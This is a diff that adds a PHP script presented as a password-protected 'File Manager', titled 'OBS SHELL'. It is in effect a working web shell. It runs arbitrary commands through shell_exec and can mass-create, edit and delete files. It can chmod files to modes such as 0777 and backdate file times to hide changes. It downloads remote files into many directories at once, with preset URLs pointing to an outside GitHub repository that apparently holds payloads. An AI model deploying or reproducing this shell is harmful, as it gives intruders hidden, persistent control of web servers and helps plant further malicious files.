@@ -1,0 +1,808 @@
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+// ================== CONFIG ==================
+$CONFIG_ROOT = '/var/www';   // GANTI SESUAI MAU LO
+$PASSWORD_HASH = '$2y$10$XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'; // HASH BCRYPT LO
+$SESSION_KEY   = 'fm_auth';
+// ============================================
+
+session_start();
+
+define('BASE_DIR', rtrim(realpath($CONFIG_ROOT) ?: __DIR__, DIRECTORY_SEPARATOR));
+
+function cleanPath($path) {
+    $path = trim($path);
+    if ($path === '') $path = BASE_DIR;
+    if ($path[0] !== DIRECTORY_SEPARATOR) {
+        $path = BASE_DIR . DIRECTORY_SEPARATOR . $path;
+    }
+    $real = realpath($path);
+    if ($real === false) return BASE_DIR;
+    if (strpos($real, BASE_DIR) !== 0) return BASE_DIR;
+    return $real;
+}
+
+// ======= AUTH (BCRYPT) =======
+if (!isset($_SESSION[$SESSION_KEY]) || $_SESSION[$SESSION_KEY] !== true) {
+    $error = '';
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fm_login_pass'])) {
+        $pass = (string)($_POST['fm_login_pass']);
+        if (password_verify($pass, $PASSWORD_HASH)) { // verify bcrypt[web:92][web:95]
+            $_SESSION[$SESSION_KEY] = true;
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            $error = "Password salah.";
+        }
+    }
+    ?>
+    <!doctype html>
+    <html>
+    <head>
+    <meta charset="utf-8">
+    <title>File Manager Login</title>
+    <style>
+     body { background:#020617; color:#e5e7eb; font-family:system-ui, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; cursor:default; }
+     .box { background:#111827; padding:20px 24px; border-radius:10px; border:1px solid #1f2937; box-shadow:0 10px 30px rgba(0,0,0,0.6); width:280px; }
+     h3 { margin:0 0 12px; font-size:13px; text-transform:uppercase; letter-spacing:0.12em; color:#9ca3af; text-align:center; }
+     input[type=password] { width:100%; padding:8px 10px; border-radius:6px; border:1px solid #374151; background:#020617; color:#e5e7eb; font-size:13px; box-sizing:border-box; }
+     button { margin-top:10px; width:100%; padding:8px 10px; border-radius:999px; border:1px solid #38bdf8; background:radial-gradient(circle at 0 0, rgba(56,189,248,0.2), #0f172a); color:#e5e7eb; font-size:12px; cursor:pointer; }
+     button:hover { background:radial-gradient(circle at 0 0, rgba(56,189,248,0.3), #020617); }
+     .err { margin-top:8px; font-size:11px; color:#fca5a5; text-align:center; min-height:14px; }
+    </style>
+    </head>
+    <body>
+      <form method="post">
+        <div class="box">
+          <h3>Protected Panel</h3>
+          <input type="password" name="fm_login_pass" placeholder="Password"><br>
+          <button type="submit">Enter</button>
+          <div class="err"><?php echo htmlspecialchars($error, ENT_QUOTES, 'UTF-8'); ?></div>
+        </div>
+      </form>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// ======= MAIN PANEL SETUP =======
+$pwd         = isset($_GET['pwd']) ? cleanPath($_GET['pwd']) : BASE_DIR;
+$action      = isset($_POST['action']) ? $_POST['action'] : '';
+$messages    = [];
+$debug       = [];
+$editFile    = isset($_GET['edit']) ? basename($_GET['edit']) : '';
+$terminalOut = '';
+
+$presets = [
+    'A' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/p',
+    'B' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/',
+    'C' => 'https://example.com/templates/footer.html',
+    'D' => 'https://example.com/templates/maintenance.html',
+];
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $pwd = isset($_GET['pwd']) ? cleanPath($_GET['pwd']) : BASE_DIR;
+
+    // CREATE NEW FILE (single / mass ke dir terpilih)
+    if ($action === 'create_file') {
+        $rawName = isset($_POST['new_file_name']) ? $_POST['new_file_name'] : '';
+        $name    = trim($rawName);
+        $name    = basename($name);
+        $content = isset($_POST['new_file_content']) ? $_POST['new_file_content'] : '';
+
+        if ($name === '') {
+            $messages[] = "Nama file baru wajib diisi.";
+        } else {
+            $dirs = isset($_POST['dir_targets']) ? (array)$_POST['dir_targets'] : [];
+
+            if ($dirs) {
+                foreach ($dirs as $dirPath) {
+                    $dirPath = cleanPath($dirPath);
+                    if (!is_dir($dirPath)) {
+                        $messages[] = "[FAIL] Dir target tidak ada: $dirPath";
+                        continue;
+                    }
+                    $dest = rtrim($dirPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
+                    if (file_exists($dest)) {
+                        $messages[] = "[FAIL] File sudah ada: $dest";
+                        continue;
+                    }
+                    if (file_put_contents($dest, $content) === false) { // write file[web:83]
+                        $messages[] = "[FAIL] Gagal membuat file baru di $dest";
+                    } else {
+                        $messages[] = "[OK]   Berhasil membuat file baru di $dest";
+                    }
+                }
+            } else {
+                $dest = $pwd . DIRECTORY_SEPARATOR . $name;
+                if (file_exists($dest)) {
+                    $messages[] = "[FAIL] File sudah ada: $dest";
+                } else {
+                    if (file_put_contents($dest, $content) === false) {
+                        $messages[] = "[FAIL] Gagal membuat file baru: $dest";
+                    } else {
+                        $messages[] = "[OK]   Berhasil membuat file baru: $dest";
+                    }
+                }
+            }
+        }
+    }
+
+    // INLINE RENAME SATU FILE
+    if (strpos($action, 'rename_one:') === 0) {
+        $old = substr($action, strlen('rename_one:'));
+        $old = basename($old);
+        $new = isset($_POST['rename_val'][$old]) ? trim($_POST['rename_val'][$old]) : '';
+        if ($new === '') {
+            $messages[] = "Nama baru kosong untuk $old.";
+        } else {
+            $from = $pwd . DIRECTORY_SEPARATOR . $old;
+            if (!is_file($from)) {
+                $messages[] = "[FAIL] File tidak ada: $from";
+            } else {
+                $to = $pwd . DIRECTORY_SEPARATOR . basename($new);
+                if (!@rename($from, $to)) {
+                    $messages[] = "[FAIL] Gagal rename $from -> $to";
+                } else {
+                    $messages[] = "[OK]   Berhasil rename $from -> $to";
+                }
+            }
+        }
+    }
+
+    // INLINE DELETE SATU FILE
+    if (strpos($action, 'delete_one:') === 0) {
+        $name = substr($action, strlen('delete_one:'));
+        $name = basename($name);
+        $path = $pwd . DIRECTORY_SEPARATOR . $name;
+        if (!is_file($path)) {
+            $messages[] = "[FAIL] File tidak ada: $path";
+        } elseif (!@unlink($path)) {
+            $messages[] = "[FAIL] Gagal hapus file: $path";
+        } else {
+            $messages[] = "[OK]   Berhasil hapus file: $path";
+        }
+    }
+
+    // EDIT SAVE
+    if ($action === 'edit_save') {
+        $fileName = isset($_POST['edit_file']) ? basename($_POST['edit_file']) : '';
+        $content  = isset($_POST['file_content']) ? $_POST['file_content'] : '';
+        if ($fileName === '') {
+            $messages[] = "Nama file untuk edit kosong.";
+        } else {
+            $path = $pwd . DIRECTORY_SEPARATOR . $fileName;
+            if (!is_file($path)) {
+                $messages[] = "[FAIL] File tidak ada: $path";
+            } elseif (!is_writable($path)) {
+                $messages[] = "[FAIL] File tidak bisa ditulis: $path";
+            } elseif (file_put_contents($path, $content) === false) {
+                $messages[] = "[FAIL] Gagal menyimpan isi file: $path";
+            } else {
+                $messages[] = "[OK]   Berhasil menyimpan file: $path";
+            }
+        }
+    }
+
+    // DEPLOY VIA URL
+    if ($action === 'deploy_url') {
+        $url        = isset($_POST['src_url']) ? trim($_POST['src_url']) : '';
+        $rawTarget  = isset($_POST['target_name_url']) ? $_POST['target_name_url'] : '';
+        $targetName = trim($rawTarget);
+        $targetName = basename($targetName);
+
+        if ($url === '' || $targetName === '') {
+            $messages[] = "URL dan nama file tujuan wajib diisi.";
+        } elseif (!preg_match('#^https?://#i', $url)) {
+            $messages[] = "URL harus dimulai dengan http:// atau https://";
+        } else {
+            $data = @file_get_contents($url);
+            if ($data === false) {
+                $messages[] = "Gagal download dari URL.";
+            } else {
+                if (strpos($pwd, BASE_DIR) !== 0) {
+                    $messages[] = "[FAIL] PWD keluar dari BASE_DIR.";
+                } else {
+                    $dirs = isset($_POST['dir_targets']) ? (array)$_POST['dir_targets'] : [];
+                    if ($dirs) {
+                        foreach ($dirs as $dirPath) {
+                            $dirPath = cleanPath($dirPath);
+                            if (!is_dir($dirPath)) {
+                                $messages[] = "[FAIL] Dir target tidak ada: $dirPath";
+                                continue;
+                            }
+                            $dest = rtrim($dirPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $targetName;
+                            if (file_put_contents($dest, $data) === false) {
+                                $messages[] = "[FAIL] Gagal simpan ke $dest";
+                            } else {
+                                $messages[] = "[OK]   Berhasil download ke $dest";
+                            }
+                        }
+                    } else {
+                        $dest = rtrim($pwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $targetName;
+                        if (is_dir($dest)) {
+                            $messages[] = "[FAIL] Tujuan adalah direktori, bukan file: $dest";
+                        } elseif (file_put_contents($dest, $data) === false) {
+                            $messages[] = "[FAIL] Gagal simpan ke $dest";
+                        } else {
+                            $messages[] = "[OK]   Berhasil download ke $dest";
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // DEPLOY VIA UPLOAD
+    if ($action === 'deploy_upload') {
+        $rawTarget  = isset($_POST['target_name_upload']) ? $_POST['target_name_upload'] : '';
+        $targetName = trim($rawTarget);
+        $targetName = basename($targetName);
+
+        if (!isset($_FILES['src_file']) || $_FILES['src_file']['error'] !== UPLOAD_ERR_OK) {
+            $messages[] = "Upload gagal atau tidak ada file.";
+        } elseif ($targetName === '') {
+            $messages[] = "Nama file tujuan wajib diisi.";
+        } else {
+            if (strpos($pwd, BASE_DIR) !== 0) {
+                $messages[] = "[FAIL] PWD keluar dari BASE_DIR.";
+            } else {
+                $tmp  = $_FILES['src_file']['tmp_name'];
+                $dirs = isset($_POST['dir_targets']) ? (array)$_POST['dir_targets'] : [];
+                if ($dirs) {
+                    foreach ($dirs as $dirPath) {
+                        $dirPath = cleanPath($dirPath);
+                        if (!is_dir($dirPath)) {
+                            $messages[] = "[FAIL] Dir target tidak ada: $dirPath";
+                            continue;
+                        }
+                        $dest = rtrim($dirPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $targetName;
+                        if (!@copy($tmp, $dest)) {
+                            $messages[] = "[FAIL] Gagal copy upload ke $dest";
+                        } else {
+                            $messages[] = "[OK]   Berhasil upload ke $dest";
+                        }
+                    }
+                } else {
+                    $dest = rtrim($pwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $targetName;
+                    if (is_dir($dest)) {
+                        $messages[] = "[FAIL] Tujuan adalah direktori, bukan file: $dest";
+                    } else {
+                        if (!@move_uploaded_file($tmp, $dest)) {
+                            if (!@copy($tmp, $dest)) {
+                                $messages[] = "[FAIL] Gagal simpan upload ke $dest";
+                            } else {
+                                $messages[] = "[OK]   Berhasil upload ke $dest (via copy)";
+                            }
+                        } else {
+                            $messages[] = "[OK]   Berhasil upload ke $dest";
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // CHMOD MASS/SINGLE (FILE + DIR)
+    if ($action === 'chmod_apply') {
+        $fileTargets = isset($_POST['file_targets']) ? (array)$_POST['file_targets'] : [];
+        $dirTargets  = isset($_POST['dir_targets'])  ? (array)$_POST['dir_targets']  : [];
+        $modeStr     = isset($_POST['chmod_mode']) ? trim($_POST['chmod_mode']) : '';
+        if ((!$fileTargets && !$dirTargets) || $modeStr === '') {
+            $messages[] = "Pilih file/dir dan isi mode chmod (misal: 0777 atau 644).";
+        } else {
+            $mode = octdec($modeStr); // oktal[web:40][web:38][web:93]
+            foreach ($fileTargets as $t) {
+                $f = $pwd . DIRECTORY_SEPARATOR . basename($t);
+                if (!file_exists($f)) {
+                    $messages[] = "[FAIL] Target file tidak ada: $f";
+                    continue;
+                }
+                if (!@chmod($f, $mode)) {
+                    $messages[] = "[FAIL] Gagal chmod file $f ke $modeStr";
+                } else {
+                    $messages[] = "[OK]   Berhasil chmod file $f ke $modeStr";
+                }
+            }
+            foreach ($dirTargets as $d) {
+                $dirPath = cleanPath($d);
+                if (!is_dir($dirPath)) {
+                    $messages[] = "[FAIL] Target dir tidak ada: $dirPath";
+                    continue;
+                }
+                if (!@chmod($dirPath, $mode)) {
+                    $messages[] = "[FAIL] Gagal chmod dir $dirPath ke $modeStr";
+                } else {
+                    $messages[] = "[OK]   Berhasil chmod dir $dirPath ke $modeStr";
+                }
+            }
+        }
+    }
+
+    // MODIFY WAKTU MASS/SINGLE (file saja)
+    if ($action === 'time_apply') {
+        $targets = isset($_POST['file_targets']) ? (array)$_POST['file_targets'] : [];
+        $timeStr = isset($_POST['time_value']) ? trim($_POST['time_value']) : '';
+        if (!$targets || $timeStr === '') {
+            $messages[] = "Pilih file dan isi waktu (YYYY-MM-DD HH:MM:SS).";
+        } else {
+            $ts = strtotime($timeStr);
+            if ($ts === false) {
+                $messages[] = "Format waktu tidak valid.";
+            } else {
+                foreach ($targets as $t) {
+                    $f = $pwd . DIRECTORY_SEPARATOR . basename($t);
+                    if (!file_exists($f)) {
+                        $messages[] = "[FAIL] Target tidak ada: $f";
+                        continue;
+                    }
+                    if (!@touch($f, $ts)) {
+                        $messages[] = "[FAIL] Gagal set waktu $f ke $timeStr";
+                    } else {
+                        $messages[] = "[OK]   Berhasil set waktu $f ke $timeStr";
+                    }
+                }
+            }
+        }
+    }
+
+    // TERMINAL
+    if ($action === 'terminal_exec') {
+        $cmd = isset($_POST['terminal_cmd']) ? trim($_POST['terminal_cmd']) : '';
+        if ($cmd === '') {
+            $messages[] = "Perintah terminal kosong.";
+        } else {
+            $fullCmd = 'cd ' . escapeshellarg($pwd) . ' && ' . $cmd . ' 2>&1';
+            $output = @shell_exec($fullCmd); // shell_exec[web:102][web:106]
+            if ($output === null) {
+                $messages[] = "[FAIL] shell_exec diblokir di server.";
+            } else {
+                $terminalOut = $output;
+            }
+        }
+    }
+}
+
+// load isi file kalau lagi edit
+$editContent = '';
+if ($editFile !== '') {
+    $editPath = $pwd . DIRECTORY_SEPARATOR . $editFile;
+    if (is_file($editPath) && is_readable($editPath)) {
+        $editContent = file_get_contents($editPath);
+    } else {
+        $messages[] = "[FAIL] Tidak bisa membaca file: $editPath";
+        $editFile = '';
+    }
+}
+
+$self   = htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES, 'UTF-8');
+$parent = dirname($pwd);
+?>
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>File Manager Simple (Inline Rename + Terminal)</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+ :root {
+   --bg: #020617;
+   --border: #1f2937;
+   --accent: #38bdf8;
+   --accent-soft: rgba(56,189,248,0.12);
+   --accent-strong: #0ea5e9;
+   --text: #e5e7eb;
+   --text-soft: #9ca3af;
+   --danger: #f97373;
+   --danger-soft: rgba(248,113,113,0.15);
+   --ok: #4ade80;
+   --ok-soft: rgba(74,222,128,0.15);
+   --row-hover: rgba(55,65,81,0.7);
+   --row-selected: rgba(56,189,248,0.14);
+   --input-bg: #020617;
+ }
+ * { box-sizing: border-box; }
+ body {
+   margin: 0;
+   padding: 16px;
+   font-family: "Inter", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+   font-size: 13px;
+   background:
+     radial-gradient(circle at top, #1f2937 0, #020617 40%, #000 100%);
+   color: var(--text);
+   cursor: default;
+ }
+ h1, h3 {
+   margin: 0 0 12px;
+   font-weight: 600;
+   letter-spacing: 0.08em;
+   text-transform: uppercase;
+   font-size: 12px;
+   color: var(--text-soft);
+ }
+ input[type=text],
+ input[type=file],
+ textarea {
+   font-family: inherit;
+   font-size: 13px;
+   border-radius: 6px;
+   border: 1px solid var(--border);
+   background: var(--input-bg);
+   color: var(--text);
+   padding: 6px 8px;
+   outline: none;
+   transition: border-color .15s ease, box-shadow .15s ease, background .15s ease;
+   width: 100%;
+ }
+ input[type=text]:focus,
+ textarea:focus {
+   border-color: var(--accent);
+   box-shadow: 0 0 0 1px var(--accent-soft);
+ }
+ textarea {
+   height: 320px;
+   resize: vertical;
+   line-height: 1.4;
+   font-family: "JetBrains Mono", SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+   font-size: 12px;
+ }
+ .box {
+   border-radius: 10px;
+   border: 1px solid var(--border);
+   padding: 10px 12px;
+   margin-bottom: 12px;
+   background: radial-gradient(circle at top left, rgba(56,189,248,0.08), rgba(15,23,42,0.98));
+   box-shadow: 0 10px 30px rgba(0,0,0,0.55);
+ }
+ .box strong {
+   font-size: 12px;
+   text-transform: uppercase;
+   letter-spacing: 0.08em;
+   color: var(--text-soft);
+ }
+ a {
+   text-decoration: none;
+   color: var(--accent);
+ }
+ a:hover {
+   color: var(--accent-strong);
+ }
+ table {
+   border-collapse: collapse;
+   width: 100%;
+   font-size: 12px;
+   margin-top: 4px;
+   table-layout: fixed;
+ }
+ th, td {
+   border: 1px solid var(--border);
+   padding: 6px 8px;
+   text-align: left;
+   white-space: nowrap;
+   overflow: hidden;
+   text-overflow: ellipsis;
+ }
+ th {
+   background: #020617;
+   font-weight: 500;
+   color: var(--text-soft);
+   font-size: 11px;
+   text-transform: uppercase;
+   letter-spacing: 0.06em;
+ }
+ th:nth-child(1), td:nth-child(1) { width: 4%; }
+ th:nth-child(2), td:nth-child(2) { width: 6%; }
+ th:nth-child(3), td:nth-child(3) { width: 40%; }
+ th:nth-child(4), td:nth-child(4) { width: 10%; }
+ th:nth-child(5), td:nth-child(5) { width: 20%; }
+ th:nth-child(6), td:nth-child(6) { width: 10%; }
+ th:nth-child(7), td:nth-child(7) { width: 5%; }
+ th:nth-child(8), td:nth-child(8) { width: 15%; }
+
+ tbody tr {
+   background: linear-gradient(90deg, rgba(15,23,42,0.96), rgba(15,23,42,0.9));
+   transition: background .12s ease, box-shadow .12s ease, transform .04s ease;
+ }
+ tbody tr:hover {
+   background: var(--row-hover);
+ }
+ tbody tr.selected-row {
+   background: var(--row-selected);
+   box-shadow: inset 0 0 0 1px var(--accent-soft);
+ }
+
+ @keyframes folderGlow {
+   0%   { box-shadow: 0 0 0px rgba(56,189,248,0); }
+   50%  { box-shadow: 0 0 14px rgba(56,189,248,0.9); }
+   100% { box-shadow: 0 0 0px rgba(56,189,248,0); }
+ }
+ tr.folder-row td:nth-child(3) {
+   position: relative;
+ }
+ tr.folder-row td:nth-child(3)::before {
+   content: "";
+   position: absolute;
+   inset: 0;
+   border-radius: 6px;
+   border: 1px solid rgba(56,189,248,0.0);
+   pointer-events: none;
+   animation: folderGlow 2.6s ease-in-out infinite;
+ }
+
+ button {
+   border-radius: 999px;
+   border: 1px solid rgba(148,163,184,0.5);
+   background: radial-gradient(circle at 0 0, rgba(56,189,248,0.15), rgba(15,23,42,0.95));
+   color: var(--text);
+   font-size: 11px;
+   padding: 4px 10px;
+   cursor: pointer;
+   display: inline-flex;
+   align-items: center;
+   gap: 4px;
+   transition: background .15s ease, border-color .15s ease, transform .05s ease, box-shadow .15s ease;
+ }
+ button:hover {
+   border-color: var(--accent);
+   background: radial-gradient(circle at 0 0, rgba(56,189,248,0.25), rgba(15,23,42,0.95));
+   box-shadow: 0 0 0 1px rgba(56,189,248,0.25);
+ }
+ button:active {
+   transform: translateY(1px) scale(0.99);
+   box-shadow: none;
+ }
+ .btn-danger {
+   border-color: rgba(248,113,113,0.6);
+   background: radial-gradient(circle at 0 0, rgba(248,113,113,0.15), rgba(15,23,42,0.95));
+ }
+ .btn-danger:hover {
+   border-color: var(--danger);
+   background: radial-gradient(circle at 0 0, rgba(248,113,113,0.25), rgba(15,23,42,0.95));
+   box-shadow: 0 0 0 1px rgba(248,113,113,0.25);
+ }
+ .w150 { width: 100%; }
+ .preset-pulse {
+   box-shadow: 0 0 0 1px rgba(56,189,248,0.7), 0 0 12px rgba(56,189,248,0.6);
+   transition: box-shadow .2s ease;
+ }
+ .debug {
+   font-family: "JetBrains Mono", monospace;
+   font-size: 11px;
+   color: #fbbf24;
+   margin-top: 4px;
+   white-space: pre-wrap;
+ }
+ .term-output {
+   margin-top:8px;
+   padding:8px;
+   border-radius:6px;
+   border:1px solid #1f2937;
+   background:#020617;
+   font-family:"JetBrains Mono",monospace;
+   font-size:11px;
+   max-height:260px;
+   overflow:auto;
+   white-space:pre-wrap;
+ }
+ .header {
+   display:flex;
+   align-items:center;
+   gap:10px;
+   margin-bottom:10px;
+ }
+ .logo {
+   width:24px;
+   height:24px;
+   border-radius:8px;
+   background: conic-gradient(from 90deg,#38bdf8,#0ea5e9,#22c55e,#eab308,#38bdf8);
+   box-shadow: 0 0 16px rgba(56,189,248,0.8);
+ }
+ .title-text {
+   font-size:13px;
+   letter-spacing:0.12em;
+   text-transform:uppercase;
+   color:var(--text-soft);
+ }
+
+ a,
+ button,
+ input[type=checkbox],
+ input[type=file],
+ input[type=submit] {
+   cursor: pointer;
+ }
+ input[type=text],
+ textarea {
+   cursor: text;
+ }
+</style>
+<script>
+function setPreset(url) {
+  const el = document.getElementById('src_url');
+  if (!el) return;
+  el.value = url;
+  el.classList.add('preset-pulse');
+  setTimeout(() => el.classList.remove('preset-pulse'), 500);
+}
+function toggleFileCheckboxes(source) {
+  document.querySelectorAll('.file-check').forEach(cb => {
+    cb.checked = source.checked;
+  });
+}
+document.addEventListener('DOMContentLoaded', () => {
+  document.querySelectorAll('tbody tr').forEach(row => {
+    row.addEventListener('click', e => {
+      const tag = e.target.tagName.toLowerCase();
+      if (tag === 'button' || tag === 'input' || tag === 'a' || e.target.closest('button') || e.target.closest('a')) return;
+      document.querySelectorAll('tbody tr.selected-row').forEach(r => r.classList.remove('selected-row'));
+      row.classList.add('selected-row');
+    });
+  });
+});
+</script>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo"></div>
+  <div class="title-text">OBS SHELL</div>
+</div>
+
+<?php if (!empty($messages) || (!empty($debug) && $terminalOut === '')): ?>
+<div class="box">
+  <?php foreach ($messages as $m): ?>
+    <div><?php echo htmlspecialchars($m, ENT_QUOTES, 'UTF-8'); ?></div>
+  <?php endforeach; ?>
+  <?php if (!empty($debug) && $terminalOut === ''): ?>
+    <div class="debug">
+      <?php echo htmlspecialchars(implode("\n\n", $debug), ENT_QUOTES, 'UTF-8'); ?>
+    </div>
+  <?php endif; ?>
+</div>
+<?php endif; ?>
+
+<!-- 1. PWD -->
+<div class="box">
+  <strong>PWD (root sekarang):</strong><br>
+  <input type="text" value="<?php echo htmlspecialchars($pwd, ENT_QUOTES, 'UTF-8'); ?>" readonly><br><br>
+  <?php if ($parent !== $pwd && strpos($parent, BASE_DIR) === 0): ?>
+    <a href="<?php echo $self; ?>?pwd=<?php echo urlencode($parent); ?>">[..] Naik satu level</a>
+  <?php endif; ?>
+</div>
+
+<!-- 3. Terminal -->
+<form method="post" action="<?php echo $self . '?pwd=' . urlencode($pwd); ?>">
+<div class="box">
+  <strong>Terminal (cd ke PWD, lalu jalanin perintah):</strong><br><br>
+  <input type="text" name="terminal_cmd" placeholder="contoh: ls -la atau whoami"><br><br>
+  <button type="submit" name="action" value="terminal_exec">RUN COMMAND</button>
+  <?php if ($terminalOut !== ''): ?>
+    <div class="term-output">
+      <?php echo htmlspecialchars($terminalOut, ENT_QUOTES, 'UTF-8'); ?>
+    </div>
+  <?php endif; ?>
+</div>
+</form>
+
+<!-- 5. Preset file (URL) -->
+<form method="post" action="<?php echo $self . '?pwd=' . urlencode($pwd); ?>">
+<div class="box">
+  <strong>Preset file (URL diisi di script) + UBAH NAMA FILE (mass ke dir centang):</strong><br><br>
+  <?php foreach ($presets as $key => $url): ?>
+    <button type="button" onclick="setPreset('<?php echo htmlspecialchars($url, ENT_QUOTES, 'UTF-8'); ?>')">
+      Preset <?php echo htmlspecialchars($key, ENT_QUOTES, 'UTF-8'); ?>
+    </button>
+  <?php endforeach; ?><br><br>
+  <input type="text" id="src_url" name="src_url" placeholder="https://example.com/file.php"><br><br>
+  <input type="text" name="target_name_url" placeholder="nama file tujuan, misal: file.php"><br><br>
+  <button type="submit" name="action" value="deploy_url">SAVE (single ke PWD / mass ke dir centang)</button>
+</div>
+</form>
+
+<!-- 2. Isi PWD (plus CHMOD & waktu di bawahnya, masih 1 form yang sama) -->
+<form method="post" action="<?php echo $self . '?pwd=' . urlencode($pwd); ?>">
+<div class="box">
+  <strong>Isi PWD (folder + file):</strong><br><br>
+  <?php
+    $items = scandir($pwd);
+    if ($items === false) {
+        echo '<em>Tidak bisa membaca direktori.</em>';
+    } else {
+        echo '<table>';
+        echo '<thead><tr>
+                <th><input type="checkbox" onclick="toggleFileCheckboxes(this)"></th>
+                <th>TIPE</th>
+                <th>NAMA FILE / DIR</th>
+                <th>EDIT</th>
+                <th>RENAME</th>
+                <th>DELETE</th>
+                <th>PERM</th>
+                <th>MTIME</th>
+              </tr></thead><tbody>';
+        foreach ($items as $it) {
+            if ($it === '.' || $it === '..') continue;
+            $full = $pwd . DIRECTORY_SEPARATOR . $it;
+            $safe = htmlspecialchars($it, ENT_QUOTES, 'UTF-8');
+            $perm = substr(sprintf('%o', @fileperms($full)), -4);
+            $mtime = @filemtime($full);
+            $mtimeStr = $mtime ? date('Y-m-d H:i:s', $mtime) : '-';
+
+            if (is_dir($full)) {
+                $link = $self . '?pwd=' . urlencode($full);
+                echo '<tr class="folder-row">';
+                echo '<td><input type="checkbox" name="dir_targets[]" value="'.htmlspecialchars($full,ENT_QUOTES,'UTF-8').'"></td>';
+                echo '<td>DIR</td>';
+                echo '<td><a href="'.$link.'">'.$safe.'/</a></td>';
+                echo '<td colspan="2"></td>';
+                echo '<td></td>';
+                echo '<td>'.htmlspecialchars($perm, ENT_QUOTES, 'UTF-8').'</td>';
+                echo '<td>'.$mtimeStr.'</td>';
+                echo '</tr>';
+            } else {
+                $editLink = $self . '?pwd=' . urlencode($pwd) . '&edit=' . urlencode($it);
+                echo '<tr>';
+                echo '<td><input type="checkbox" class="file-check" name="file_targets[]" value="'.$safe.'"></td>';
+                echo '<td>FILE</td>';
+                echo '<td>'.$safe.'</td>';
+                echo '<td><a href="'.$editLink.'">EDIT</a></td>';
+                echo '<td>
+                        <input type="text" class="w150" name="rename_val['.$safe.']" value="'.$safe.'">
+                        <button type="submit" name="action" value="rename_one:'.$safe.'">RENAME</button>
+                      </td>';
+                echo '<td>
+                        <button type="submit" class="btn-danger" name="action" value="delete_one:'.$safe.'" onclick="return confirm(\'Hapus '.$safe.'?\')">DELETE</button>
+                      </td>';
+                echo '<td>'.htmlspecialchars($perm, ENT_QUOTES, 'UTF-8').'</td>';
+                echo '<td>'.$mtimeStr.'</td>';
+                echo '</tr>';
+            }
+        }
+        echo '</tbody></table>';
+    }
+  ?>
+</div>
+
+<!-- 4. Create new file -->
+<form method="post" action="<?php echo $self . '?pwd=' . urlencode($pwd); ?>">
+<div class="box">
+  <strong>Create new file (single ke PWD / mass ke dir yang dicentang):</strong><br><br>
+  <input type="text" name="new_file_name" placeholder="contoh: newfile.php"><br><br>
+  <textarea name="new_file_content" placeholder="// isi file baru..."></textarea><br><br>
+  <button type="submit" name="action" value="create_file">CREATE FILE</button>
+</div>
+</form>
+
+<!-- 6. CHMOD (tetap pakai checkbox di tabel di atas) -->
+<div class="box">
+  <strong>CHMOD (file + dir, single / mass):</strong><br>
+  <input type="text" name="chmod_mode" placeholder="misal: 0777 atau 644"><br><br>
+  <button type="submit" name="action" value="chmod_apply">APPLY CHMOD (ke file/dir yang dicentang)</button>
+</div>
+
+<!-- 7. Modify waktu (pakai checkbox file di atas) -->
+<div class="box">
+  <strong>Modify waktu (mtime) (file saja, single / mass):</strong><br>
+  <input type="text" name="time_value" placeholder="YYYY-MM-DD HH:MM:SS, contoh: 2026-03-07 01:57:14"><br><br>
+  <button type="submit" name="action" value="time_apply">APPLY WAKTU (ke file yang dicentang)</button>
+</div>
+</form>
+
+<!-- 8. Edit file -->
+<?php if ($editFile !== ''): ?>
+<form method="post" action="<?php echo $self . '?pwd=' . urlencode($pwd); ?>">
+  <div class="box">
+    <strong>8. Edit file:</strong><br><br>
+    <input type="text" name="edit_file" value="<?php echo htmlspecialchars($editFile, ENT_QUOTES, 'UTF-8'); ?>" readonly><br><br>
+    <textarea name="file_content"><?php echo htmlspecialchars($editContent, ENT_QUOTES, 'UTF-8'); ?></textarea><br><br>
+    <button type="submit" name="action" value="edit_save">SAVE FILE</button>
+  </div>
+</form>
+<?php endif; ?>
+
+</body>
+</html>
